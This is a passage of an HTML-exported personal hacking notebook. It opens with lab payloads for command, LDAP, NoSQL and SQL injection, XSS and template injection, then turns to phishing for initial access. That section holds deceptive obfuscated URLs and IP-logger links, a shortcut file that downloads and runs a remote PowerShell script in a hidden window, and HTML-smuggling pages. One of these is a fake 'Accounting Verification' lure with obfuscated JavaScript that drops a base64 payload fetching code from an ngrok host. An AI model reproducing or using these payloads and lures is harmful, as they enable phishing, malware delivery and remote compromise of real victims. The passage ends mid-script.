level-6'>chaining</h1><br/><p>blahblah;id</p></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--Pentesterlab--Command_injection--backticks_755.html"></a><h1 class='title level-6'>backticks</h1><br/><p>blahblah`sleep 5`</p><p></p><p><img src="images/755-1.png" alt="images/755-1.png" /></p></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--Pentesterlab--Command_injection--$(sleep_5)_756.html"></a><h1 class='title level-6'>$(sleep 5)</h1><br/><p>blahblah$(sleep 5)</p></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--Pentesterlab--LDAP_Injection_757.html"></a><h1 class='title level-5'>LDAP Injection</h1><br/></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--Pentesterlab--LDAP_Injection--auth_bypass__null_bind_758.html"></a><h1 class='title level-6'>auth bypass | null bind</h1><br/><p>NULL Bind</p><p><img src="images/758-1.png" alt="images/758-1.png" /></p><p></p><p>remove username and password paramaters fully and resend request</p></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--Pentesterlab--LDAP_Injection--auth_bypass_759.html"></a><h1 class='title level-6'>auth bypass</h1><br/><p></p><p></p><p>url?name=admin)(cn=*))%00&amp;password=admin</p><p></p><p>)(cn=*))%00</p><p></p><p><img src="images/759-1.png" alt="images/759-1.png" /></p><p></p></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--Pentesterlab--MongoDB_760.html"></a><h1 class='title level-5'>MongoDB</h1><br/></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--Pentesterlab--MongoDB--Auth_Bypass_761.html"></a><h1 class='title level-6'>Auth Bypass</h1><br/><p>url?username=admin&#39; || 1==1%00&amp;password=a%00&amp;submit=Submit+Query</p><p></p><p><img src="images/761-1.png" alt="images/761-1.png" /></p><p></p></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--Pentesterlab--MongoDB--MongoDB_this.password.match_762.html"></a><h1 class='title level-6'>MongoDB this.password.match</h1><br/><p>?search=admin&#39; %26%26 this.password.match(/d/)%00</p><p></p><p><img src="images/762-1.png" alt="images/762-1.png" /></p><p></p><p>Site will change based on whether our query has matching of the admin password or not</p></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--Pentesterlab--SQL_763.html"></a><h1 class='title level-5'>SQL</h1><br/></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--Pentesterlab--SQL--Auth_Bypass_764.html"></a><h1 class='title level-6'>Auth Bypass</h1><br/><p>&#39; or 1=1-- -</p><p></p><p>&#39; or 1=1#</p><p></p><p>&quot; or 1=1#</p><p></p></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--Pentesterlab--SQL--Limit_Auth_Bypass_765.html"></a><h1 class='title level-6'>Limit Auth Bypass</h1><br/><p><span style="color:#3f4043;">In case developer only allows one returned account in the response. </span></p><p>&#39; or 1=1 LIMIT 1#</p></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--Pentesterlab--SQL--Auth_bypass_with_some_waf_bypass_766.html"></a><h1 class='title level-6'>Auth bypass with some waf bypass</h1><br/><p><span style="color:#3f4043;">Bypass spaces:</span></p><p>&#39;%09or%091=1#</p><p></p><p><span style="color:#3f4043;">Bypass spaces and tabulations/%09:</span></p><p>admin&#39;||1=1#</p><p></p><p><span style="color:#3f4043;">Bypass addslashes:</span></p><p>%bf%27||4=4#</p><p>%bf%27+or+4=4#</p><p></p></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--Pentesterlab--XSS_767.html"></a><h1 class='title level-5'>XSS</h1><br/></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--Pentesterlab--XSS--XSS_filter_bypass_768.html"></a><h1 class='title level-6'>XSS filter bypass</h1><br/><p><span style="color:#3f4043;">If they have a blacklist on script, this can possibly get around it:</span></p><p>&lt;sCR&lt;script&gt;iPt&gt;confirm(1)&lt;/SCr&lt;/script&gt;IPt&gt;</p><p></p><p><img src="images/768-1.png" alt="images/768-1.png" /></p><p></p></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--Pentesterlab--XSS--inside_script_in_var_tag_781.html"></a><h1 class='title level-6'>inside script in var tag</h1><br/><p>; is to terminate string</p><p>// is to comment</p><p></p><p></p><p>&quot;;alert(1)//</p><p></p><p><img src="images/781-1.png" alt="images/781-1.png" /></p><p></p></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--Pentesterlab--XSS--index.php-something_path_782.html"></a><h1 class='title level-6'>index.php/something path</h1><br/><p><span style="color:#3f4043;">So notice how it&#39;s not in a paramater, but it&#39;s still being reflected in source code</span></p><p>/index.php/za&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</p><p></p></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--Pentesterlab--SSTI_771.html"></a><h1 class='title level-5'>SSTI</h1><br/></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--Pentesterlab--SSTI--page_not_found__python_jinja_772.html"></a><h1 class='title level-6'>page not found | python jinja</h1><br/><p><a href="http://ptl-eaa17e73-d927d701.libcurl.so/test%7B%7B7*7%7D%7D">http://ptl-eaa17e73-d927d701.libcurl.so/test%7B%7B7*7%7D%7D</a></p><p><img src="images/772-1.png" alt="images/772-1.png" /></p><p></p><p></p><p></p><p></p><p><img src="images/772-2.png" alt="images/772-2.png" /></p><p></p><p></p><p>/test{{&#39;&#39;.__class__.mro()[2].__subclasses__()[233](&quot;uname -a&quot;, shell=True,stdout=-1).communicate()}}</p><p></p><p><img src="images/772-3.png" alt="images/772-3.png" /></p><p></p></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--Pentesterlab--SSTI--php_twig_773.html"></a><h1 class='title level-6'>php twig</h1><br/><p>name={{_self.env.registerUndefinedFilterCallback(%27exec%27)}}{{_self.env.getFilter(%27sleep%205%27)}}</p><p></p></div><div class='page'><a name="Methdology--Initial_Access_896.html"></a><h1 class='title level-2'>Initial Access</h1><br/><p>Ways in:</p><p><ul><li>Exposed services with Rce</li><li>Exposed VPNs are very common. Credentials for this can be phished. So can cookies(although research the specifics more)</li><li>Phishing with malware. Credential/session phishing can give indirect access if you use the technique below with it.</li><li>Jump boxes are a convenient way into resources for an internal network. Common ports exposed on a jump box are ssh and rdp so you can access resources internally. However, if this is not properly hardened, and attacker can use this as a pivot point. Again, credentials could be phished, or ssh private key could potentially be found on a github commit.</li><li>Physical Access(Bootcd, Lanturtle, etc)</li></ul></p><p></p><p></p><p><a href="https://enlacehacktivista.org/index.php/Initial_Access_Tactics,_techniques_and_procedures">https://enlacehacktivista.org/index.php/Initial_Access_Tactics,_techniques_and_procedures</a></p><p></p></div><div class='page'><a name="Methdology--Initial_Access--Phishing_techniques_719.html"></a><h1 class='title level-3'>Phishing techniques</h1><br/><p></p><p>Phishing tools:</p><p><a href="https://github.com/htr-tech/zphisher">https://github.com/htr-tech/zphisher</a></p><p><a href="https://localxpose.io/">https://localxpose.io/</a> mby?</p><p>browser in the browser:</p><p><a href="https://github.com/mrd0x/BITB">https://github.com/mrd0x/BITB</a></p><p><a href="https://www.youtube.com/watch?v=ntS7WHaznjI&t=127s">https://www.youtube.com/watch?v=ntS7WHaznjI&amp;t=127s</a></p><p>tunnelmole</p><p></p><p>Phishing:</p><p><a href="https://t.ly/gD4u#/spark/register.php">https://t.ly/gD4u#/spark/register.php</a></p><p><a href="https://t.ly/gLhGk#/Spark/Uploads/Brians-HardFails.mp4">https://t.ly/gLhGk#/Spark/Uploads/Brians-HardFails.mp4</a></p><p></p><p>Learn phishing and 2fa phishing:</p><p><a href="https://www.youtube.com/watch?v=-B4mvcdGmwY&t=591s">https://www.youtube.com/watch?v=-B4mvcdGmwY&amp;t=591s</a></p><p></p><p>For IPV4 and domain encoding:</p><p><a href="https://subnetonline.com/pages/converters/ip-to-bin-dec-and-bin-32-bit.php">https://subnetonline.com/pages/converters/ip-to-bin-dec-and-bin-32-bit.php</a></p><p><a href="https://splitline.github.io/domain-obfuscator/">https://splitline.github.io/domain-obfuscator/</a></p><p></p><p>You can name .exe files .com :DDDDDDDDDDDDDDDDDDDD</p><p></p><p>zip toplevel domain and nasty unicode technique with @:</p><p><a href="https://www.youtube.com/watch?v=LFriS1PICE0&t=1s">https://www.youtube.com/watch?v=LFriS1PICE0&amp;t=1s</a></p><p></p><p>phishign shit:</p><p></p><p><a href="https://is.gd/create.php">https://is.gd/create.php</a></p><p><a href="https://www.httrack.com/">https://www.httrack.com/</a></p><p><a href="https://caniphish.com/free-phishing-test/phishing-website-templates#signupForm">https://caniphish.com/free-phishing-test/phishing-website-templates#signupForm</a></p><p><a href="https://www.pythonanywhere.com/">https://www.pythonanywhere.com/</a></p><p></p><p><span style="color:#3f4043;">To make websites thats aids to takedown for companies:</span></p><p>submit-form.com</p><p>Heroku</p><p><a href="https://ipfs.tech/">https://ipfs.tech/</a></p><p><a href="https://jemi.so/">https://jemi.so/</a></p><p><ul><li>qr code :)</li><li>messag on phonew ith name over number</li><li>phising link with telling them instructions on putting in 2fa :)</li></ul></p><p></p><p><a href="https://www.youtube.com/watch?v=aA0cAwZoV7s">https://www.youtube.com/watch?v=aA0cAwZoV7s</a></p><p><a href="https://iplogger.com/2SR5B5">https://iplogger.com/</a></p><p><a href="http://srturl.in/">http://srturl.in/</a></p><p><a href="http://13.235.254.162/a2oBH_">http://13.235.254.162/a2oBH_</a></p><p>0xD.0xEB.0xFE.0xA2/a2oBH_</p><p>015.0353.0376.0242/a2oBH_</p><p>0xD.0xEB.0xFE.0xA2/MLQ3E7</p><p></p><p><a href="https://github.com/IceM4nn/IP-Obfuscator">https://github.com/IceM4nn/IP-Obfuscator</a></p><p><a href="https://www.hacksparrow.com/tools/converters/ip-address.html">https://www.hacksparrow.com/tools/converters/ip-address.html</a></p><p></p><p><a href="http://www.youtube.com∕watch=rYEDA3JcQqw:list=PLMC9KNkIncKtPzgY-5rmhvj7fax8fdxoj@0x3.0x10.0x79.0x1E/Ya4xH-J55k#index=4">http://www.youtube.com∕watch=rYEDA3JcQqw:list=PLMC9KNkIncKtPzgY-5rmhvj7fax8fdxoj@0x3.0x10.0x79.0x1E/Ya4xH-J55k#index=4</a></p><p></p><p>https:∕∕www.youtube.com∕watch=rYEDA3JcQqwlist=PLMC9KNkIncKtPzgY-5rmhvj7fax8fdxoj@t.ly/xF0FA#index=4&amp;t=102</p><p></p><p>hakks360@gmail.com</p><p></p><p>51411230</p><p></p><p>http://www.<span style="color:#24211e;">stackoverflow.com∕questions∕how-to-use-phps-password-hash-to-hash-and-verify-passwords∕returnPath=@51411230/Ou71Nhe0ft?tokenvalue=bdf7c3aa356b635d6094e55f38a566fda84d39ff4a10f0883f70c3fd17e456ee5fefb76787a7a54ec96f278c4624f09c5ce0d7e2ea454a0d5da1ef34c39597ef</span></p><p></p><p><a href="http://www.youtube.com∕watch=rYEDA3JcQqwlist=PLMC9KNkIncKtPzgY-5rmhvj7fax8fdxoj@51411230/Ou71Nhe0ft#index=4&t=102">www.youtube.com∕watch=rYEDA3JcQqwlist=PLMC9KNkIncKtPzgY-5rmhvj7fax8fdxoj@51411230/Ou71Nhe0ft#index=4&amp;t=102</a></p><p></p><p><a href="http://www.youtube.com∕watch=rYEDA3JcQqwlist=PLMC9KNkIncKtPzgY-5rmhvj7fax8fdxoj@0x310791e/Ou71Nhe0ft#index=4&t=102">www.youtube.com∕watch=rYEDA3JcQqwlist=PLMC9KNkIncKtPzgY-5rmhvj7fax8fdxoj@0x310791e/Ou71Nhe0ft#index=4&amp;t=102</a></p><p></p><p><h1>Nasty ones:</h1></p><p>∕</p><p></p><p>https://login.tearns.com∕login.srf&amp;wa=ws@t.ly/OLqiN?wa=wsignin1.0</p><p></p><p>www.github.com∕akveo∕ngx-admin∕blob∕master∕tsconfig.json&amp;auth_token=0cc175b9c0f1b6a831c399e269772661@51411230/Ou71Nhe0ft?q=sdaa&amp;ei=I6rSZM-_Af29xc8Pvp6OsA8&amp;ved=0ahUKEwiP3dPk982AAxX9XvEDHT6PA_YQ4dUDCA4&amp;uact=5&amp;oq=sdaa&amp;gs_lp=Egxnd3Mtd2l6LXNlcnAiBHNkYWEyBRAAGIAEMg0QABiABBixAxiDARgKMgUQABiABDIFEAAYgAQyBRAuGIAEMgUQABiABDINEAAYgAQYsQMYgwEYCjIFEAAYgAQyBRAAGIAEMhMQLhiABBixAxiDARjHARjRAxgKSN0FUK0DWOYEcAF4AJABAJgBuAGgAYsEqgEDMC4zuAEDyAEA-AEBwgILEAAYigUYsQMYgwHCAhEQLhiABBixAxiDARjHARjRA8ICCBAAGIAEGLEDwgILEC4YigUYsQMYgwHCAgsQABiABBixAxiDAeIDBBgBIEGIBgE&amp;sclient=gws-wiz-serp</p><p></p><p>http://www.<span style="color:#24211e;">stackoverflow.com∕questions∕how-to-use-phps-password-hash-to-hash-and-verify-passwords∕returnPath=@51411230/Ou71Nhe0ft?tokenvalue=bdf7c3aa356b635d6094e55f38a566fda84d39ff4a10f0883f70c3fd17e456ee5fefb76787a7a54ec96f278c4624f09c5ce0d7e2ea454a0d5da1ef34c39597ef</span></p><p></p><p>https:∕∕www.youtube.com∕watch=rYEDA3JcQqwlist=PLMC9KNkIncKtPzgY-5rmhvj7fax8fdxoj@t.ly/<a href="https://t.ly/KIrzP">KIrzP</a>?index=4&amp;t=102</p><p>https:∕∕<a href="http://www.youtube.com∕watch=rYEDA3JcQqwlist=PLMC9KNkIncKtPzgY-5rmhvj7fax8fdxoj@t.ly/KIrzP?index=4&t=102">www.youtube.com∕watch=rYEDA3JcQqwlist=PLMC9KNkIncKtPzgY-5rmhvj7fax8fdxoj@t.ly/KIrzP?index=4&amp;t=102</a></p><p></p><p>www.etsy.com∕no-en∕listing∕1463900942∕new-hand-decorated-blue-galaxy-design&amp;click_key=d6ea5f22ff6cb97cf83aa64f483de8b986e9bf99:1463900942&amp;retUrl=@t.ly/pCfSe#click_sum=76e53b35&amp;ref=search2_top_narrowing_intent_modules_top_rated-2&amp;sts=1</p><p></p><p>https://www.etsy.com∕no-en∕listing∕1463900942∕new-hand-decorated-blue-galaxy-design&amp;click_key=d6ea5f22ff6cb97cf83aa64f483de8b986e9bf99:1463900942&amp;retUrl=@t.ly/CrTHj?retUri=https:∕∕www.etsy.com∕no-en∕listing∕1463900942∕new-hand-decorated-blue-galaxy-design&amp;click_key=d6ea5f22ff6cb97cf83aa64f483de8b986e9bf99:1463900942click_sum=76e53b35&amp;ref=search2_top_narrowing_intent_modules_top_rated-2&amp;sts=1</p><p></p><p>htTP;51411230/uDe7b1C7Zj</p><p>htTP;0x3.0x10.0x79.0x1e/uDe7b1C7Zj</p><p></p><p><a href="http://catenabible.com∕daily∕9-17@51411230/uDe7b1C7Zj">http://catenabible.com∕daily∕9-17@51411230/uDe7b1C7Zj</a></p><p></p><p><a href="http://www.openbible.info∕labs∕cross-references∕searchq=Jeremiah+29:11@51411230/uDe7b1C7Zj?tsaVa&ei=I3VBSM2-332NT3">http://www.openbible.info∕labs∕cross-references∕searchq=Jeremiah+29:11@51411230/uDe7b1C7Zj?tsaVa&amp;ei=I3VBSM2-332NT3</a></p><p></p><p>Discord PC:</p><p>[<a href="https://www﮳youtube﮳com/watch?v=2yPjnNeFCnQ&t=743s">https://www﮳youtube﮳com/watch?v=2yPjnNeFCnQ&amp;t=743s</a>](&lt;<a href="https://gooniboon1.neocities.org/meow3">https://gooniboon1.neocities.org/meow3</a>&gt;)</p><p></p><p>Discord Phone:</p><p>[https:ͅ//<a href="http://www.facebook.com/public/Matt](">www.facebook.com/public/Matt](</a>&lt;<a href="https://www.pornhub.com/view_video.php?viewkey=ph60ef54fd771f1">https://www.pornhub.com/view_video.php?viewkey=ph60ef54fd771f1</a>&gt;)⁪⁪⁭⁪⁭⁪⁭⁪⁭⁭⁭⁭⁪⁭⁪⁪⁪⁪⁪</p><p></p><p><a href="https://iplogger.com/2e7KB4">https://iplogger.com/2e7KB4</a></p><p></p><p>[<a href="https://www﮳youtube﮳com/watch?v=2yPjnNeFCnQ&t=743s">https://www﮳youtube﮳com/watch?v=2yPjnNeFCnQ&amp;t=743s</a>](&lt;<a href="https://gooniboon1.neocities.org/meow3">https://gooniboon1.neocities.org/meow3</a>&gt;)</p><p></p><p></p></div><div class='page'><a name="Methdology--Initial_Access--Phishing_techniques--hiding_malware_869.html"></a><h1 class='title level-4'>hiding malware</h1><br/><p><a href="https://www.youtube.com/watch?v=jcLYtfNhAMQ&t=201s">https://www.youtube.com/watch?v=jcLYtfNhAMQ&amp;t=201s</a></p><p><a href="https://www.youtube.com/watch?v=cxxPscfxpTE&list=PLVRiVswinO4b94STplWMWzCtzopM80TGt&index=88&t=73s">https://www.youtube.com/watch?v=cxxPscfxpTE&amp;list=PLVRiVswinO4b94STplWMWzCtzopM80TGt&amp;index=88&amp;t=73s</a></p><p></p><p>.pif</p><p>.scr</p><p>.bat</p><p>.img</p><p>.iso</p><p></p><p></p><p>character map, 202E</p><p>select, copy</p><p></p><p>cutegpj.bat</p><p></p><p>aasda.htaasdsad</p></div><div class='page'><a name="Methdology--Initial_Access--Phishing_techniques--lnk_method_871.html"></a><h1 class='title level-4'>lnk method</h1><br/><p>make shortcut on desktop</p><p></p><p>add this in target section: </p><p></p><p>C:\Windows\System32\cmd.exe /c C:\Windows\System32\notepad.exe | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -ep bypass -WindowStyle Hidden IEX (iwr -usebasicparsing <a href="http://192.168.255.132/nishang.ps1)">http://192.168.255.132/nishang.ps1)</a></p><p></p><p>change icon to notepad.</p><p>zip it up.(needs to be done in powershell admin window)</p><p></p><p>Compress-Archive -Path .\work_shortcut.lnk -DestinationPath work.zip</p><p></p><p>now email or send to someone. if you send file directly they will see powershell.exe. if you send like this, they&#39;ll see this here and</p><p><img src="images/871-1.png" alt="images/871-1.png" /></p><p></p><p>this here</p><p><a href="https://cdn.discordapp.com/attachments/955491469429456976/1168617164174012446/eqnIutp.png"><img src="images/871-2.png" alt="images/871-2.png" /></a></p><p></p><p>and this (even with extensions turned on) </p><p><a href="https://cdn.discordapp.com/attachments/955491469429456976/1168617164425678868/nBpj8EG.png"><img src="images/871-3.png" alt="images/871-3.png" /></a></p><p></p><p></p><p></p><p><a href="https://cdn.discordapp.com/attachments/955491469429456976/1168617391404625940/SPOILER_zV8wN8K.png"><img src="images/871-4.png" alt="images/871-4.png" /></a></p><p></p><p>poc when double click work_shortcut &lt;3</p></div><div class='page'><a name="Methdology--Initial_Access--Phishing_techniques--Html_Smuggling_874.html"></a><h1 class='title level-4'>Html Smuggling</h1><br/><p><div class="codebox"><pre><span style="color:#7f0044;font-weight:400">&lt;html&gt;</span><br />    <span style="color:#7f0044;font-weight:400">&lt;body&gt;</span><br />        <span style="color:#7f0044;font-weight:400">&lt;script&gt;</span><br />            function base64ToArrayBuffer(base64) {<br />            var binary_string = window.atob(base64);<br />            var len = binary_string.length;<br />            <br />            var bytes = new Uint8Array( len );<br />                for (var i = 0; i &lt; len; i++) { bytes[i] = binary_string.charCodeAt(i); }<br />                return bytes.buffer;<br />            }<br /><br />            <span style="color:#0088ff;font-weight:400">// 32bit simple reverse shell</span><br />            var file = &#39;PGh0bWw+DQo8aGVhZD4NCjx0aXRsZT5Qb3dlclNoZWxsIFJ1bm5lcjwvdGl0bGU+DQo8SFRBOkFQUExJQ0FUSU9OIA0KICAgICBBUFBMSUNBVElPTk5BTUU9IlBvd2VyU2hlbGwgUnVubmVyIg0KICAgICBJRD0iUG93ZXJTaGVsbFJ1bm5lciINCiAgICAgU0NST0xMPSJubyINCiAgICAgU0lOR0xFSU5TVEFOQ0U9InllcyINCiAgICAgV0lORE9XU1RBVEU9Im1pbmltaXplIg0KPg0KPC9oZWFkPg0KPHNjcmlwdCBsYW5ndWFnZT0iVkJTY3JpcHQiPg0KICAgIFN1YiBXaW5kb3dfT25Mb2FkDQogICAgICAgICcgQ3JlYXRlIFdTY3JpcHQgU2hlbGwNCiAgICAgICAgU2V0IG9ialNoZWxsID0gQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikNCiAgICAgICAgDQogICAgICAgICcgUnVuIFBvd2VyU2hlbGwgY29tbWFuZA0KICAgICAgICBvYmpTaGVsbC5SdW4gInBvd2Vyc2hlbGwuZXhlIC1ub3AgLWVwIGJ5cGFzcyAtV2luZG93U3R5bGUgSGlkZGVuIElFWCAoaXdyIC11c2ViYXNpY3BhcnNpbmcgaHR0cDovLzAudGNwLmV1Lm5ncm9rLmlvOjE0NTU1L29iZnVzY2F0ZWQucHMxKSIsIDEsIGZhbHNlDQogICAgICAgIA0KICAgICAgICAnIENsb3NlIHRoZSBIVEENCiAgICAgICAgd2luZG93LmNsb3NlDQogICAgRW5kIFN1Yg0KPC9zY3JpcHQ+DQo8Ym9keT4NCjwvYm9keT4NCjwvaHRtbD4NCg==&#39;<br />            var data = base64ToArrayBuffer(file);<br />            var blob = new Blob([data], {type: &#39;octet/stream&#39;});<br />            var fileName = &#39;Project.hta&#39;;<br /><br />            if (window.navigator.msSaveOrOpenBlob) {<br />                window.navigator.msSaveOrOpenBlob(blob,fileName);<br />            } else {<br />                var a = document.createElement(&#39;a&#39;);<br />                console.log(a);<br />                document.body.appendChild(a);<br />                a.style = &#39;display: none&#39;;<br />                var url = window.URL.createObjectURL(blob);<br />                a.href = url;<br />                a.download = fileName;<br />                a.click();<br />                window.URL.revokeObjectURL(url);<br />            }<br />        <span style="color:#7f0044;font-weight:400">&lt;/script&gt;</span><br />    <span style="color:#7f0044;font-weight:400">&lt;/body&gt;</span><br /><span style="color:#7f0044;font-weight:400">&lt;/html&gt;</span></pre></div></p><p></p><p></p><p><span style="color:#3f4043;">get B64:</span></p><p>cat m.zip | base64 | tr -d &#39;\n&#39; | tee aa</p><p>base64 m.zip | tr -d &#39;\n&#39; | tee aa</p><p></p><p><span style="color:#3f4043;">obfuscate js:</span></p><p><a href="https://obfuscator.io/">https://obfuscator.io/</a></p></div><div class='page'><a name="Methdology--Initial_Access--Phishing_techniques--Html_Smuggling--html_smuggling_v2_875.html"></a><h1 class='title level-5'>html smuggling v2</h1><br/><p><span style="color:#3f4043;">get B64:</span></p><p>cat &#39;Audit Report.zip&#39; | base64 | tr -d &#39;\n&#39; | tee aa</p><p>base64 &#39;Audit Report.zip&#39; | tr -d &#39;\n&#39; | tee aa</p><p></p><p><span style="color:#3f4043;">obfuscate js:</span></p><p><a href="https://obfuscator.io/">https://obfuscator.io/</a></p><p></p><p></p><p></p><p>&lt;!DOCTYPE html&gt;</p><p>&lt;html lang=&quot;en&quot;&gt;</p><p>&lt;head&gt;</p><p>    &lt;meta charset=&quot;UTF-8&quot;&gt;</p><p>    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</p><p>    &lt;title&gt;Company Verification&lt;/title&gt;</p><p>    &lt;style&gt;</p><p>        body {</p><p>            font-family: &#39;Arial&#39;, sans-serif;</p><p>            margin: 0;</p><p>            padding: 0;</p><p>            background: url(&#39;<a href="https://img.freepik.com/free-photo/close-up-smiley-woman-with-laptop_23-2149300649.jpg?w=1380&t=st=1700394697~exp=1700395297~hmac=50fa3b14e80a85e397caaf7ea21cfa3d9f852ffd876a10d381e441169ad327b8')">https://img.freepik.com/free-photo/close-up-smiley-woman-with-laptop_23-2149300649.jpg?w=1380&amp;t=st=1700394697~exp=1700395297~hmac=50fa3b14e80a85e397caaf7ea21cfa3d9f852ffd876a10d381e441169ad327b8&#39;)</a> center/cover no-repeat fixed;</p><p>            color: #333;</p><p>            text-align: center;</p><p>            display: flex;</p><p>            align-items: center;</p><p>            justify-content: center;</p><p>            height: 100vh;</p><p>        }</p><p></p><p>        h1 {</p><p>            color: #fff;</p><p>            font-size: 36px;</p><p>            margin: 20px 0;</p><p>        }</p><p></p><p>        h2 {</p><p>            color: #fff;</p><p>            font-size: 18px;</p><p>            line-height: 1.6;</p><p>        }</p><p>         h2 {</p><p>            color: #fff;</p><p>            font-size: 18px;</p><p>            line-height: 1.6;</p><p>        }</p><p>    &lt;/style&gt;</p><p>&lt;/head&gt;</p><p>&lt;body&gt;</p><p>    &lt;main&gt;</p><p>        &lt;h1&gt;Accounting Verification System&lt;/h1&gt;</p><p>        &lt;h2&gt;Please verify the downloaded document to confirm the accuracy of the company details&lt;/h2&gt;</p><p>        &lt;h2&gt;Contact our email as soon as information has been verified&lt;/h2&gt;</p><p>    &lt;/main&gt;</p><p></p><p>                &lt;script&gt;</p><p>var _0x1b2c3d=_0x3435;(function(_0x217ba3,_0xd198e0){var _0x13bf2f=_0x3435,_0x1ed312=_0x217ba3();while(!![]){try{var _0x140b8d=parseInt(_0x13bf2f(0x134))/0x1+parseInt(_0x13bf2f(0x137))/0x2*(parseInt(_0x13bf2f(0x12b))/0x3)+parseInt(_0x13bf2f(0x133))/0x4+-parseInt(_0x13bf2f(0x13c))/0x5*(parseInt(_0x13bf2f(0x138))/0x6)+-parseInt(_0x13bf2f(0x13e))/0x7*(parseInt(_0x13bf2f(0x125))/0x8)+-parseInt(_0x13bf2f(0x13a))/0x9*(-parseInt(_0x13bf2f(0x13f))/0xa)+parseInt(_0x13bf2f(0x12e))/0xb*(-parseInt(_0x13bf2f(0x12d))/0xc);if(_0x140b8d===_0xd198e0)break;else _0x1ed312[&#39;push&#39;](_0x1ed312[&#39;shift&#39;]());}catch(_0x1da6bb){_0x1ed312[&#39;push&#39;](_0x1ed312[&#39;shift&#39;]());}}}(_0xb6f9,0x23de7));function base64ToArrayBuffer(_0x4aa08b){var _0x550807=_0x3435,_0x26aebe=window[_0x550807(0x140)](_0x4aa08b),_0x9fc9f4=_0x26aebe[_0x550807(0x128)],_0x2f922a=new Uint8Array(_0x9fc9f4);for(var _0x4e028b=0x0;_0x4e028b&lt;_0x9fc9f4;_0x4e028b++){_0x2f922a[_0x4e028b]=_0x26aebe[_0x550807(0x123)](_0x4e028b);}return _0x2f922a[_0x550807(0x12f)];}var file=&#39;UEsDBBQAAAAIAIAhc1fQIkToyQQAALwMAAAUAAAAQXVkaXQgUmVwb3J0LnR4dC5sbmvtVn9M1GUY//BDfuipx0ASV0K5c5DjuAMKuGJhJwiDAXmOY+xcIvdVLuHuG3dwkH+0tZrapNmcjLY0bJht/dhcmrV+TLeytWGxVpQ41DJHs6XDrc1WjT7v+/1+j+NgVJv943rePe+P533fz/O8z/N+v+9TByAuIx6CTssaVb9XpCCHnUPOgWc+Sx2Pq+rO3fXGyvE4Y4w9yXKhVs/Q0vgMZDdebhjNuebwmV/9LgXrbLZDWShwOjyYS02wy9bj/nLQDLfP7w2Eg6hAKhJx4+PdDeFq1T3yrJUr1iWJdXEx+wu9V+GGD354EUAYQcoy0aKjKu4tL5rh6guGlM6iQuDRWbjnJO5V03y4rzd9Axf6iBeCgk4UgduxkiMNeXfDhZqIvY2BsNLlalc6OrA5ouFCjer+Wmq4aJ5Pw/D18RjLG2WroIua29l2sIBBqI+cxrPfjB671QY45tFzeV49zdWF6CGCFdyGDGLyJAyex93/Qg5UYXpQmG5VehVQl4YrZg0PvVKRHMG9FcFts9RDjVgcjFhsZdtLBlaT28l367tFm6/v3kFOIyeQs/27MqXpvCK6Rz1GzDxzXOwRDvDE2v0I9VrhmVXP9q5nTjxjV8znf0/Ed54FT3s/nIzJ7dbZQX/5uULlLcjnrGi3EVFFK/cGpTQaz0VNfdylcKaaci+Lwtkc1KASzWxzKQ1Tm9jZTQSFeALLhzaJ2iX7fsYnh/aEWFSeq4ClhBaF5Cpx5m7WYlUX9e5k38fWQatFsZELON6G7VJHG3GFB7xcp3JsRx6y/7G/xPlD8uytEkHzt7gvi4AhC9sJ/W4t4Thcf2bVZPyW+lMbrMfffmzwlJjbqt2zoWb97nmV4M5QQM0vUne0F5fYkbH2+yubVx9b/05jZteBuvc+d5yd/PPhnutpR2phyjt/ouVv5xPkb3DIol3aTYFAyDJzgf2BkKK2erVreseTZVYENzF2InqWfxHZ/+lOoBEyE4qhZPzKqOat6ZWvwQyl8At+kO1+PgxO3gM/70aAf65W+YJvZqmS0hAeZwHMB8Wuypbpp4G8a0kpYpRWW+4S4ywdMy6KxWudqMtNJj7xJeNIP7IMjoEJfLo8G3vuGsSZl2nnyAh6enrwUO80Ms+a0Do2hsnqJpzAYfw2dRQ3b97ES/y+U3mWn4hldzW6kpPcpoGEi85DrVfu/fZS41rxjsnkRGRQ09AetqVCsES3IE2flILpaU2wKFYgD5UetSUxFmNxrCDV2DJNSjMmowWmWEFcrNqEaIGgk/o5bVOWUzc2rjIfnYrfuu/wz2/mGSZl67jr+emqDJpP/8X7ZMgg05XFxsLl5IXzBGCFYajoGJml6C8TnQrMpKErdEQphO9HLRcl7dWN/sX20bgTezceuzWaPhzcfl8n5V7DFpF9GG+reAtv35udB4P6dUN+eL656sO6UucHf6QfWDvY+cWT0d4rILtojp38ALlQ9opZF/KzsKGMz20hlRdJqY2tnZJStiUcl1JaJEc2+diWybV2iadJDDqiG/PaE2255Qe/Sjs5htMN51eOPgctPZPGOID/JHtZOGPSqEw38Hhm54a3+tXqY9UV1uHy3n33QMsdmcYAxZdqzWvOvVv5fijrk4mOp0oRRX8BUEsBAhQAFAAAAAgAgCFzV9AiROjJBAAAvAwAABQAAAAAAAAAAAAAAAAAAAAAAEF1ZGl0IFJlcG9ydC50eHQubG5rUEsFBgAAAAABAAEAQgAAAPsEAAAAAA==&#39;,data=base64ToArrayBuffer(file),blob=new Blob([data],{&#39;type&#39;:_0x1b2c3d(0x139)}),fileName=_0x1b2c3d(0x12a);function _0x3435(_0x5e5c5a,_0x3fb587){var _0xb6f9c=_0xb6f9();return 